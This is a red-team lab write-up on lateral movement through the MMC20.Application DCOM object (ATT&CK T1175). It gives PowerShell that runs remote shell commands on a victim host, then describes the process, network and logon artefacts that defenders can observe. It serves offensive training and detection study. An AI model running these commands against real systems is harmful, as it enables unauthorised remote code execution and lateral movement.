---
description: Lateral Movement
---

# T1175: Distributed Component Object Model

This lab explores a DCOM lateral movement technique using MMC20.Application COM as originally researched by enima0x3 in his blog post [Lateral Movement using the mmc20.application Com Object](https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/)

## Execution

MMC20.Application COM class is stored in the registry as shown below:

![](../.gitbook/assets/dcom-registry.png)

Same can be achieved with powershell:

```csharp
Get-ChildItem 'registry::HKEY_CLASSES_ROOT\WOW6432Node\CLSID\{49B2791A-B1AE-4C90-9B8E-E860BA07F889}'
```

![](../.gitbook/assets/dcom-registry2.png)

Establishing a connection to the victim host:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```csharp
$a = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","10.0.0.2"))
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Executing command on the victim system via DCOM object:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```csharp
$a.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c hostname > c:\fromdcom.txt","7")
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Below shows the command execution and the result of it - remote machine's `hostname` command output is written to `c:\fromdcom.txt`:

![](../.gitbook/assets/dcom-rce.png)

## Observations

Once the connection from an attacker to victim is established using the below powershell:

```text
[System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","10.0.0.2"))
```

This is what happens on the victim system - `svchost` spawns an `mmc.exe` which opens a listening port via RPC binding:

![](../.gitbook/assets/dcom-mmc-bind.png)

![](../.gitbook/assets/dcom-listening.png)

![](../.gitbook/assets/dcom-ancestry+connections.png)

A network connection is logged from 10.0.0.7 \(attacker\) to 10.0.0.2 \(victim\) via `offense\administrator` \(can be also seen from the above screenshot\):

![](../.gitbook/assets/dcom-logon-event.png)

![](../.gitbook/assets/dcom-connection2.png)

{% embed data="{\"url\":\"https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/\",\"type\":\"link\",\"title\":\"Lateral Movement using the MMC20.Application COM Object\",\"description\":\"For those of you who conduct pentests or red team assessments, you are probably aware that there are only so many ways to pivot, or conduct lateral movement to a Windows system. Some of those techn…\",\"icon\":{\"type\":\"icon\",\"url\":\"https://s1.wp.com/i/favicon.ico\",\"aspectRatio\":0},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://enigma0x3.files.wordpress.com/2017/01/process\_validation.png\",\"width\":1416,\"height\":598,\"aspectRatio\":0.422316384180791}}" %}

{% embed data="{\"url\":\"https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand\",\"type\":\"link\",\"title\":\"View ExecuteShellCommand method\",\"description\":\"The ExecuteShellCommand method runs a command in a window. After this method successfully starts the command in a separate process, it returns immediately \(it does not wait for the command to complete\).\",\"icon\":{\"type\":\"icon\",\"url\":\"https://docs.microsoft.com/favicon.ico\",\"aspectRatio\":0},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://docs.microsoft.com/\_themes/docs.theme/master/en-us/\_themes/images/microsoft-header.png\",\"width\":128,\"height\":128,\"aspectRatio\":1}}" %}

{% embed data="{\"url\":\"https://docs.microsoft.com/en-us/dotnet/api/system.type.gettypefromclsid?view=netframework-4.7.2\#System\_Type\_GetTypeFromCLSID\_System\_Guid\_System\_String\_\",\"type\":\"link\",\"title\":\"Type.GetTypeFromCLSID Method \(System\)\",\"description\":\"Gets the type associated with the specified class identifier \(CLSID\).\",\"icon\":{\"type\":\"icon\",\"url\":\"https://docs.microsoft.com/favicon.ico\",\"aspectRatio\":0},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://docs.microsoft.com/\_themes/docs.theme/master/en-us/\_themes/images/microsoft-header.png\",\"width\":128,\"height\":128,\"aspectRatio\":1}}" %}

{% embed data="{\"url\":\"https://docs.microsoft.com/en-us/windows/desktop/com/com-technical-overview\",\"type\":\"link\",\"title\":\"COM Technical Overview\",\"icon\":{\"type\":\"icon\",\"url\":\"https://docs.microsoft.com/favicon.ico\",\"aspectRatio\":0},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://docs.microsoft.com/\_themes/docs.theme/master/en-us/\_themes/images/microsoft-header.png\",\"width\":128,\"height\":128,\"aspectRatio\":1}}" %}

{% embed data="{\"url\":\"https://attack.mitre.org/wiki/Technique/T1175\",\"type\":\"link\",\"title\":\"Distributed Component Object Model - ATT&CK for Enterprise\"}" %}

